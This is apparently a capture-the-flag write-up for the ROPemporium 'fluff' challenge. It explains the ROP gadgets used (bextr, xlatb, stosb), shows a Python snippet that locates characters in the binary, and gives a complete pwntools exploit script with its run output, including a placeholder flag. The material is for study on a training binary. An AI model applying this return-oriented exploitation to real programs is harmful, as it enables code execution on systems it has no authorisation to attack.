# Writeup: fluff

## Introduction

This challenge follows the same pattern that the previous ROPemporium challenges follow. First we have to calculate the offset which is 40 (determined after disassembling the pwnme function in the provided library), then we figure out which gadgets we can chain together that would allow us to pass the "flag.txt" string (which we will find inside the binary) into the rdi register and then call print_file function. The trick with this challenge is that the gadgets that we need are not as straight forward as the ones in the previous challenges. In the following section I will detail how each gadget used works and why it was used. This binary also does not have PIE enabled meaning addresses are fixed across runs.

## Gadget Explanation

### pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret

#### POP RDI

POP RDI takes the next value on the stack and puts it into the rdi register. The value we will be popping into rdi is the address of the bss section. We do this because later we will be writing the flag.txt string letter by letter to rdi using the stosb instruction. 

#### POP RDX

POP RDX takes the next value on the stack and puts it into the RDX register. The value we will be popping into rdx is 0x4000 this is 64 in decimal and what this will help us do later is use the bextr commmand to extract all 64 bits in RCX to RBX.

#### POP RCX

POP RCX takes the next value on the stack and puts it into the RCX register. The value we will be popping into RCX is the address of the letter in the binary subtracted from the current value of RAX because we will be using stosb later which adds the value of AL to the value in RBX meaning we will want to cancel that out if we want to load the address of the letter and then all of that subtracted from 0x3ef2 because of the add rcx gadget we will talke about in the next section.

#### ADD RCX

This gadget adds 0x3ef2 to RCX which as I mentioned previously we will subtract from the loaded value to give us our desired address.

### XLATB

This gadget sets AL equal to the address that is composed of RBX + AL, or in other words [RBX + AL]. This is the reason we have to subtract the current value of RAX every time we load in a letter into the bss section located in RDI.

### stosb ; ret

This gadget writes AL to the address stored in RDI, or in other words [RDI] and then increments the value at RDI so we keep writing the letters one after another in memory.

### POP RDI

Finally, we pop the address of the bss section back into RDI since we have been incrementing it to write the appropriate value so we can pass it into the print_file function.

## Finding Letter Addresses

As I mentioned earlier in order to pass the correct value into print file we have to find the string "flag.txt" somewhere in the binary. The only problem is that it does not exist on it's own in the binary, at least not on its own. There does exist however, the individual letters stored inside the binary. In order to extract them from the binary I used a bit of python to extract the addresses in the binary.

```
    python3 -c "data=open('./fluff','rb').read(); base=0x400000; [print(f'{chr(byte)} (0x{byte:02x}): {[hex(base+i) for i in [j for j,b in enumerate(data) if b==byte][:10]]}') for byte in [0x66,0x6c,0x61,0x67,0x2e,0x74,0x78]]"
```

The values in the list correspond to every letter in "flag.txt" t appearing twice. This python script gave me:

```
    $ python3 -c "data=open('./fluff','rb').read(); base=0x400000; [print(f'{chr(byte)} (0x{byte:02x}): {[hex(base+i) for i in [j for j,b in enumerate(data) if b==byte][:10]]}') for byte in [0x66,0x6c,0x61,0x67,0x2e,0x74,0x78]]"
    f (0x66): ['0x4003c4', '0x4003c7', '0x4003c8', '0x4003e2', '0x4003f4', '0x400552', '0x40058a', '0x4005ca', '0x4005f6', '0x4006a6']
    l (0x6c): ['0x400239', '0x40023f', '0x400242', '0x4003c1', '0x4003c5', '0x4003e4', '0x4003f9', '0x400405', '0x40169b', '0x4016a7']
    a (0x61): ['0x4003d6', '0x40040c', '0x400411', '0x400418', '0x40041a', '0x400424', '0x4005d2', '0x4016aa', '0x4016b3', '0x4016cf']
    g (0x67): ['0x4003cf', '0x4007a0', '0x401690', '0x4016a6', '0x4016cb', '0x40174e', '0x401802', '0x4018aa', '0x4018b2', '0x4018c0']
    . (0x2e): ['0x40024e', '0x400251', '0x4003c9', '0x4003fd', '0x400400', '0x400434', '0x400436', '0x400439', '0x400553', '0x4005f7']
    t (0x74): ['0x400192', '0x4001ca', '0x400202', '0x4003d5', '0x4003d8', '0x4003e0', '0x4003f1', '0x40040b', '0x40040e', '0x400419']
    x (0x78): ['0x400246', '0x400248', '0x4006c8', '0x400725', '0x400751', '0x400778', '0x4007bc', '0x4016b5', '0x4016da', '0x401912']
```

After trying a few of these addresses out for each letter I settled on these:

```
    f   = 0x400552
    l   = 0x4003c1
    a   = 0x4005d2
    g   = 0x4003cf
    dot = 0x400553
    t   = 0x400192
    x   = 0x4006c8
```

## Results

Now that we have all of the components necessary to complete the rop chain and obtain the flag we can now write the script.

```
    from pwn import *

    p = process('./fluff')
    e = ELF('./fluff')

    bss = e.bss()
    POP_RDI = 0x00000000004006a3
    POP_RDX = 0x000000000040062a
    XLATB = 0x0000000000400628
    STOSB = 0x0000000000400639
    print_file = 0x400510
    offset = b'A' * 40
    f = 0x400552
    l = 0x4003c1
    a = 0x4005d2
    g = 0x4003cf
    dot = 0x400553
    t = 0x400192
    x = 0x4006c8
    t = 0x400192

    string_locations = [f, l, a, g, dot, t, x, t]
    letters = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']

    current_rax = 0xb # this is what rax starts with

    payload = offset + p64(POP_RDI) + p64(bss)
    for index, letter in enumerate(string_locations):
        payload += p64(POP_RDX)
        payload += p64(0x4000)
        payload += p64(letter - current_rax - 0x3ef2)
        payload += p64(XLATB)
        payload += p64(STOSB)
        current_rax = ord(letters[index])

    payload += p64(POP_RDI)      # reset RDI to start of string
    payload += p64(bss)          # RDI = 0x601038 again
    payload += p64(print_file)

    p.recvuntil(b'> ')
    p.sendline(payload)
    p.interactive()
```

Finally we can run the script and obtain the flag.

```
    [+] Starting local process './fluff': pid 70612
    [*] '/mnt/c/Users/18506/Desktop/CTF/fluff/fluff'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        RUNPATH:  b'.'
    [*] Switching to interactive mode
    Thank you!
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive
    $
    [*] Process './fluff' stopped with exit code -11 (SIGSEGV) (pid 70612)
    [*] Got EOF while sending in interactive
```

Now we have the flag.

`ROPE{a_placeholder_32byte_flag!}`
